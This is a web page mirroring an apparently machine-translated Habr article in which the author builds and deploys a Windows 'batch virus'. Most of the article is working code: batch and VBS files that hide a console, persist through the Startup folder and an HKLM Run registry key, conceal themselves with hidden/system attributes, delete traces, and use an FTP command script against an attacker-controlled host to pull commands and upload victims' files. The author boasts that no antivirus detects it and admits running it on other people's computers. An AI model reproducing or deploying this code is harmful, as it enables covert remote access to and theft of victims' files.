<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Batch virus</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Everyone at least once wanted to climb in other people's files without their knowledge, but many people are repelled by the idea of ‚Äã‚Äãdownloading vari...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Batch virus</h1><div class="post__text post__text-html js-mediator-article"> Everyone at least once wanted to climb in other people's files without their knowledge, but many people are repelled by the idea of ‚Äã‚Äãdownloading various generators, because it is not known what the creators have crammed into, and the antiviruses see them with a bang.  Once I also wanted to do something.  At first I decided to learn something simple and necessary and started from the command line, things as it later turned out to be irreplaceable. <br><a name="habracut"></a><br>  Having mastered the download by ftp, I decided to create an ordinary virus to download files from someone else‚Äôs computer: <br> <code>@echo Off</code> <br> <br> <code>@ftp -s:ftp_com.ini -i ******.host56.com</code> <br>  Rem Chose hosting 000webhost.com for the ability to edit any text files via the Internet. <br><br>  The ftp_com.ini file is the file in which the login and password are stored first, and then the ftp commands. <br>  Then I created a file to hide the command line on vbs: <br><br> <code>Set oShell = WScript.CreateObject("WScript.Shell")</code> <br> <code>oShell.Run "   ", 0, False</code> <br> <br>  Then (since on a Vista computer) I copied this vbs file to autoload.  And for at least some kind of hiding made it hidden system (since where I was going to use them, even hidden files are not displayed), adding to 1 batch file (I called it WinSys.cmd) 2 lines: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     <code>copy vbsmach.vbs "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsmach.vbs"</code> <br> <br>  vbsmach.vbs - the very vbs script. <br>  But then, having tested it on another computer on XP, I realized that it was not working and, for reliability, I shoved it into the registry file.  It turned out like this: <br><br> <code>Windows Registry Editor Version 5.00</code> <br> <br> <code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]</code> <br> <code>"System32"="\"%%userprofile%%\\AppData\\Roaming\\Microsoft\\Windows\\WinSys.cmd""</code> <br> <br>  And in the body of the batch file, we write the reg import registry file.reg <br>  Then I ran a batch file on my computer and realized that it sometimes freezes and decided to make a delay and decided to do this with another cmd-file - WinHelp.cmd by typing in it <br><br> <code>ping -n 10 127.0.0.1</code> <br> <code>cls</code> <br> <code>WinSys.cmd</code> <br> <br>  Now we need to add the ability to manage it at least somehow.  To do this, you need to add a command to the Ftp_com.ini file to download and send files: <br><br> <code>  ftp </code> <br> <code>  ftp </code> <br> <code>get ftp_com.ini</code> <br> <br> <code>get WinHelp.cmd</code> <br> <br> <code>put tree.txt</code> <br> <br> <code>bye</code> <br> <br>  I decided not to modify the WinSys.cmd file, although it can be done without problems.  Now on the ftp-server download all the files and the virus is ready.  But I added a couple of lines to the WinSys.cmd file for stealth <br><br> <code>copy vbsmach.vbs "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"</code> <br> <code>Copy Winsys.cmd "%userprofile%\AppData\Roaming\Microsoft\Windows"</code> <br> <code>Copy WinHelp.cmd "%userprofile%\AppData\Roaming\Microsoft\Windows"</code> <br> <code>Copy ftp_com.ini "%userprofile%\AppData\Roaming\Microsoft\Windows"</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsmach.vbs"</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\Winsys.cmd"</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\WinHelp.cmd"</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\ftp_com.ini"</code> <br> <br> <code>%userprofile%\AppData\Roaming\Microsoft\Windows\WinHelp.cmd</code> <br> <br>  The last line is necessary for it to work constantly. <br>  And so he is ready, but we will not give so many files to someone, so we should shove all this into either the exe file or 1 bat file, but I chose the first option, since many people are very afraid of all these bat cmd files, making it through winrar, pre-registering the launch of the file vbsmach.vbs after unzipping.  After testing this, I realized that this leaves a lot of evidence, so I decided to change a lot in the virus.  This is what happened in WinSys.cmd: <br><br> <code>@ftp -s:ftp_com.ini -i ****.host56.com</code> <br> <br> <code>cls</code> <br> <code>reg import regedit.reg</code> <br> <code>copy vbsmach.vbs "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"</code> <br> <code>Copy Winsys.cmd "%userprofile%\AppData\Roaming\Microsoft\Windows"</code> <br> <code>Copy WinHelp.cmd "%userprofile%\AppData\Roaming\Microsoft\Windows"</code> <br> <code>Copy ftp_com.ini "%userprofile%\AppData\Roaming\Microsoft\Windows"</code> <br> <code>del /q ftp_com.ini</code> <br> <code>del /q WinHelp.cmd</code> <br> <code>del /q vbsmach.vbs</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsmach.vbs"</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\Winsys.cmd"</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\WinHelp.cmd"</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\ftp_com.ini"</code> <br> <code>%userprofile%\AppData\Roaming\Microsoft\Windows\WinHelp.cmd</code> <br> <br>  When archiving, I entered the path%% userprofile% \ downloads and added the line to the WinHelp.cmd file. <br> <code>del /q %userprofile%\WinSys.cmd</code> <br> <br>  This is what a virus was after it was written: <br>  WinSys.cmd file <br><br> <code>@ftp -s:ftp_com.ini -i ****.host56.com</code> <br> <br> <code>cls</code> <br> <code>reg import regedit.reg</code> <br> <code>copy vbsmach.vbs "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"</code> <br> <code>Copy Winsys.cmd "%userprofile%\AppData\Roaming\Microsoft\Windows"</code> <br> <code>Copy WinHelp.cmd "%userprofile%\AppData\Roaming\Microsoft\Windows"</code> <br> <code>Copy ftp_com.ini "%userprofile%\AppData\Roaming\Microsoft\Windows"</code> <br> <code>del /q ftp_com.ini</code> <br> <code>del /q WinHelp.cmd</code> <br> <code>del /q vbsmach.vbs</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsmach.vbs"</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\Winsys.cmd"</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\WinHelp.cmd"</code> <br> <code>attrib +S +H "%userprofile%\AppData\Roaming\Microsoft\Windows\ftp_com.ini"</code> <br> <code>%userprofile%\AppData\Roaming\Microsoft\Windows\WinHelp.cmd</code> <br> <br>  The WInhelp.cmd file, but it is needed not only for the delay, it is best to implement the necessary functions to launch the files in it: <br><br> <code>del /q %userprofile%\WinSys.cmd</code> <br> <code>del /q %userprofile%\regedit.reg</code> <br> <code>ping -n 10 127.0.0.1</code> <br> <code>cls</code> <br> <code>WinSys.cmd</code> <br> <br>  Registry file - regedit.reg <br><br> <code>Windows Registry Editor Version 5.00</code> <br> <br> <code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]</code> <br> <code>"System32"="\"%%userprofile%%\\AppData\\Roaming\\Microsoft\\Windows\\WinHelp.cmd""</code> <br> <br>  Ftp_com.ini file <br><br>  login from ftp server <br>  password <br> <code>get ftp_com.ini</code> <br> <br> <code>get WinHelp.cmd</code> <br> <br> <code>bye</code> <br> <br>  How to work with him I think is understandable.  After creating the archive I decided to check for virustotal <a href="https://www.virustotal.com/file/da428b5c22d4730370ad2018e70eb5fed3dc2b5c7afe9e4fe93a739772aa18e1/analysis/1359883653/">www.virustotal.com/file/da428b5c22d4730370ad2018e70eb5fed3dc2b5c7afe9e4fe93a739772aa18e1/analysis/1359883653</a> <br>  And no anti-virus was surprised to suspect anything.  This is my first virus, which I decided to run on some computers, naturally on different ftp servers, but after a while I deleted it, since there was nothing interesting about them. <br>  His discovery is certainly not difficult, and the functional is enough only to scare a person (although you can download a lot of nasty things on that computer, but this is a different conversation), but it struck me that no heuristics did not recognize anything suspicious in it.  Although it can be used to view other people's files, download and run various exe files, and change the registry and other settings, in fact for a simple malware this is enough, you can also create a hidden administrator account and connect to non-Telnet.  Although for these purposes it could be made easier. <br>  After that, I began to refer to firewalls, as one of the best defenses against all kinds of mischief, and an antivirus is needed only to protect against blockers, and only that. </div><p>Source: <a href="https://habr.com/ru/post/168099/">https://habr.com/ru/post/168099/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../168087/index.html">Supercomputer for 1 billion euros: a simulation of the human brain</a></li>
<li><a href="../168089/index.html">Qt 5.0.1 and Qt Creator 2.6.2 released</a></li>
<li><a href="../168091/index.html">LiveReload on Node.js</a></li>
<li><a href="../168095/index.html">Simple-Science - Simple Experiments (Digest # 15)</a></li>
<li><a href="../168097/index.html">Nokia, Elop Effect and Burning Platform</a></li>
<li><a href="../168103/index.html">Lexand vs. BlackVue - FullHD DVRs</a></li>
<li><a href="../168105/index.html">Redefining method implementation. Inspired by java</a></li>
<li><a href="../168109/index.html">3D printer prints lunar base of regolith</a></li>
<li><a href="../168111/index.html">Anti-GTD or anti-procrastination medication</a></li>
<li><a href="../168115/index.html">Logic - the most interesting news gaming and IT-industry ‚Ññ12</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>